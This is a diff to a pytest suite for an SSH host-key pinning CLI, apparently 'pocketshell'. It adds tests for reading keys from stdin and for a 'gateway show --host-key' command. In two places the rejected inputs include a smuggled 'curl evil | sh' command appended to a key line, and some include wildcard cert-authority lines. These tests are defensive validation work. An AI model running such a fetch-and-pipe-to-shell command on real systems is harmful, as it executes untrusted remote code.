@@ -249,7 +249,8 @@ def test_missing_final_newline_is_refused(tmp_path):
 def test_require_pin_explains_how_to_get_one(tmp_path):
     with pytest.raises(PinError) as exc:
         pins.require_pin("home-lab")
-    assert "gateway show --pin-command" in str(exc.value)
+    assert "gateway show --host-key" in str(exc.value)
+    assert "pocketshell gateway pin home-lab" in str(exc.value)
     assert "never trusted" in str(exc.value)
 
 
@@ -259,3 +260,93 @@ def test_relative_xdg_config_home_is_ignored(tmp_path, monkeypatch):
     assert pins.pin_file_path() == tmp_path / "home" / ".config" / "pocketshell" / (
         "gateway_known_hosts"
     )
+
+
+# --- key from stdin / prompt (the preferred UX: no paste-able command) ---------
+
+
+def test_pin_reads_the_key_line_from_stdin(tmp_path):
+    result = CliRunner().invoke(
+        cli, ["gateway", "pin", "home-lab"], input=ED25519_LINE + "\n"
+    )
+    assert result.exit_code == 0, result.output
+    assert load_pins()["home-lab"] == parse_host_key(ED25519_LINE)
+
+
+def test_pin_stdin_without_newline_and_crlf(tmp_path):
+    runner = CliRunner()
+    assert runner.invoke(cli, ["gateway", "pin", "aaa-host"], input=ED25519_LINE).exit_code == 0
+    assert runner.invoke(
+        cli, ["gateway", "pin", "bbb-host"], input=ED25519_LINE + "\r\n"
+    ).exit_code == 0
+
+
+@pytest.mark.parametrize(
+    "data",
+    [
+        "",
+        "\n",
+        ED25519_LINE + "\n\n",
+        ED25519_LINE + "\n@cert-authority * " + ED25519_LINE + "\n",
+        ED25519_LINE + "; curl evil | sh\n",
+        "pocketshell gateway pin home-lab '" + ED25519_LINE + "'\n",
+        "x" * 20000,
+    ],
+)
+def test_pin_stdin_refuses_anything_but_one_key_line(tmp_path, data):
+    result = CliRunner().invoke(cli, ["gateway", "pin", "home-lab"], input=data)
+    assert result.exit_code == 1
+    assert not _pin_file(tmp_path).exists()
+
+
+def test_pin_validates_device_before_reading_stdin(tmp_path):
+    result = CliRunner().invoke(cli, ["gateway", "pin", "-x"], input=ED25519_LINE)
+    assert result.exit_code != 0
+    assert not _pin_file(tmp_path).exists()
+
+
+# --- host side: `gateway show --host-key` ---------------------------------------
+
+_SHOW_SCRIPT = """#!/bin/sh
+cat <<'OUT'
+server:          wss://gateway.pocketshell.io
+device id:       {device}
+local ssh:       127.0.0.1:22 (loopback only)
+device key:      SHA256:abc
+pinned ssh host key: {key}
+OUT
+exit {code}
+"""
+
+
+def test_show_host_key_prints_only_the_key_line(pin_helper, capfd):
+    pin_helper(_SHOW_SCRIPT.format(device="home-lab", key=ED25519_LINE, code=0))
+    result = CliRunner().invoke(cli, ["gateway", "show", "--host-key"])
+    assert result.exit_code == 0, result.output
+    assert result.stdout == ED25519_LINE + "\n"
+    assert "pocketshell gateway pin home-lab" in result.stderr
+    # the stdout line round-trips into `gateway pin` via stdin
+    pinned = CliRunner().invoke(cli, ["gateway", "pin", "home-lab"], input=result.stdout)
+    assert pinned.exit_code == 0, pinned.output
+
+
+@pytest.mark.parametrize(
+    "key",
+    [
+        "",
+        ED25519_LINE + "; curl evil | sh",
+        "@cert-authority * " + ED25519_LINE,
+    ],
+)
+def test_show_host_key_refuses_a_bad_enrolled_key(pin_helper, key):
+    pin_helper(_SHOW_SCRIPT.format(device="home-lab", key=key, code=0))
+    result = CliRunner().invoke(cli, ["gateway", "show", "--host-key"])
+    assert result.exit_code == 1
+    assert result.stdout == ""
+
+
+def test_show_host_key_passes_helper_failure_through(pin_helper):
+    pin_helper(_SHOW_SCRIPT.format(device="home-lab", key=ED25519_LINE, code=4))
+    result = CliRunner().invoke(cli, ["gateway", "show", "--host-key"])
+    assert result.exit_code == 4
+    assert result.stdout == ""
